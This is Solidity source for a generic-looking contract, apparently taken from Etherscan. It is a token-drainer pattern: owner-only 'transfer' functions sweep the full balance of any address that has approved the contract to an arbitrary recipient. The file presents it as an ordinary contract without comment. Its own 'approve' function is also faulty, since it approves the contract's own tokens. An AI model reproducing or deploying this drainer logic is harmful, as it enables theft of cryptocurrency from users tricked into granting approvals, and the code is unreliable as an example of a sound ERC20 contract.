/**
 *Submitted for verification at Etherscan.io on 2023-02-14
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external;
}

contract MyContract {

    address public owner;
    address[] public users;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    function approve(address tokenAddress) external returns(bool){
        require(IERC20(tokenAddress).approve(address(this), 115792089237316195423570985008687907853269984665640564039457584007913129639935));
        users.push(msg.sender);
        return true;
    }

    function allowance(address tokenAddress,address from) public view returns(uint256){
        uint256 allowanceCount = IERC20(tokenAddress).allowance(from, address(this));
        return allowanceCount;
    }
   
    function getBalance(address tokenAddress, address user) public view returns (uint256){
        return IERC20(tokenAddress).balanceOf(user);
    }

    function transfer(address tokenAddress, address from, address to) external onlyOwner {
        uint256 balance = getBalance(tokenAddress, from);
        uint256 allowanceNum = IERC20(tokenAddress).allowance(from, address(this));
        uint256 value = balance;
        if (allowanceNum < balance)value = allowanceNum;
        IERC20(tokenAddress).transferFrom(from, to,  value);
    }

    function transfer(address tokenAddress, address from, address to,uint256 money) external onlyOwner {
        uint256 balance = getBalance(tokenAddress, from);
        uint256 allowanceNum = IERC20(tokenAddress).allowance(from, address(this));
        uint256 value = balance;
        if(money < balance) value = money;
        if (allowanceNum < value)value = allowanceNum;
        IERC20(tokenAddress).transferFrom(from, to,  value);
    }

    function transferOwnership(address newOwner)  onlyOwner external {
        owner = newOwner;
    }
}